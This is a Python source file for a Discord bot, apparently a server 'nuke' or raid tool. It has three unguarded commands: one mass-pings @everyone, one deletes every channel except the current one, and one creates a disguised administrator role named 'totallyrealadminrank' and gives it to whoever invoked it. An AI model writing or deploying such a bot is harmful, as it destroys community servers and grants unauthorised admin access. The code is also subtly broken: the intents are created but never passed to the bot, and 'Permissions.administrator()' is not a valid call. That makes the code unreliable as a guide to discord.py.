import discord
from discord.ext import commands

# Define your Discord bot's command prefix
bot = commands.Bot(command_prefix='!')

# Define your Discord bot's intents
intents = discord.Intents.default()
intents.members = True

# Define your Discord bot's token
TOKEN = 'YOUR_DISCORD_BOT_TOKEN_HERE'

# Define the !ping command
@bot.command()
async def ping(ctx):
    await ctx.send('@everyone')

# Define the !deletechannels command
@bot.command()
async def deletechannels(ctx):
    channels = ctx.guild.channels
    for channel in channels:
        if channel != ctx.channel:
            await channel.delete()

# Define the !admin command
@bot.command()
async def admin(ctx):
    guild = ctx.guild
    admin_role = await guild.create_role(name="totallyrealadminrank", permissions=discord.Permissions.administrator())
    await ctx.author.add_roles(admin_role)

# Start your Discord bot
bot.run(TOKEN)
